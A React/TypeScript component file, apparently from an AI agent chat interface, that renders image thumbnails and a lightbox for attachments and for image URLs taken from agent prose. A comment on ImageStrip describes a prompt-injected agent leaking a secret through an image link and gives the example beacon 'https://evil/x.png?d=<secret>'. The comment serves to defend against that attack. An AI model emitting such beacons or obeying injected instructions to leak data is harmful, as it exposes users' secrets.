"use client";

import { createContext, useContext, useEffect, useState, useSyncExternalStore } from "react";
import type { ShownImages } from "../format/shown-images";

function Lightbox({ src, onClose }: { src: string; onClose: () => void }) {
  useEffect(() => {
    const onKey = (e: KeyboardEvent) => { if (e.key === "Escape") onClose(); };
    document.addEventListener("keydown", onKey);
    return () => document.removeEventListener("keydown", onKey);
  }, [onClose]);

  return (
    <div
      className="fixed inset-0 z-[9999] bg-black/85 flex items-center justify-center cursor-zoom-out [animation:ao-lb-in_0.15s_ease]"
      onClick={onClose}
      role="dialog"
      aria-modal
    >
      {/* eslint-disable-next-line @next/next/no-img-element */}
      <img
        src={src}
        alt="Attachment preview"
        className="max-w-[min(90vw,1400px)] max-h-[90vh] w-auto h-auto rounded-[10px] shadow-[0_24px_80px_rgba(0,0,0,0.6)] cursor-default"
        onClick={(e) => e.stopPropagation()}
      />
      <button
        className="fixed top-[20px] right-[24px] w-[36px] h-[36px] rounded-full bg-white/[0.12] border border-white/[0.2] text-white text-[16px] cursor-pointer flex items-center justify-center transition-[background] duration-[120ms] hover:bg-white/[0.22]"
        onClick={onClose}
        aria-label="Close"
      >✕</button>
    </div>
  );
}

/** `hideOnError`: for refs scraped from agent prose, where a dead one (an example
 *  URL, a deleted file) is expected. Attachments keep the browser's broken image. */
export function InlineImage({ src, hideOnError = false }: { src: string; hideOnError?: boolean }) {
  const [open, setOpen] = useState(false);
  const [failed, setFailed] = useState(false);
  if (failed) return null;
  return (
    <>
      <button
        type="button"
        className="block p-0 border border-ao-line-1 rounded-[8px] overflow-hidden cursor-zoom-in bg-ao-bg-3 transition-[border-color,box-shadow] duration-[120ms] shrink-0"
        onClick={() => setOpen(true)}
        aria-label="View image"
      >
        {/* eslint-disable-next-line @next/next/no-img-element */}
        <img
          src={src}
          alt="Attachment"
          onError={hideOnError ? () => setFailed(true) : undefined}
          className="block max-w-[180px] max-h-[140px] w-auto h-auto object-cover"
        />
      </button>
      {open && <Lightbox src={src} onClose={() => setOpen(false)} />}
    </>
  );
}

export const ShownImagesContext = createContext<ShownImages | null>(null);

const noSubscribe = () => () => {};

/** Row of thumbnails. `agentProse`: refs scraped from an agent's text — hide our own
 *  dead ones, and skip any an image-job card in this thread is already showing. An
 *  external URL keeps its broken icon: hiding it would make an injected agent's
 *  `https://evil/x.png?d=<secret>` beacon invisible. */
export function ImageStrip({ urls, agentProse = false }: { urls: string[]; agentProse?: boolean }) {
  const shown = useContext(ShownImagesContext);
  const store = agentProse ? shown : null;
  useSyncExternalStore(store?.subscribe ?? noSubscribe, () => store?.version() ?? 0, () => 0);
  const visible = store ? urls.filter((u) => !store.has(u)) : urls;
  if (visible.length === 0) return null;
  return (
    <div className="flex flex-wrap gap-2 mt-2">
      {visible.map((url) => <InlineImage key={url} src={url} hideOnError={agentProse && url.startsWith("/api/")} />)}
    </div>
  );
}
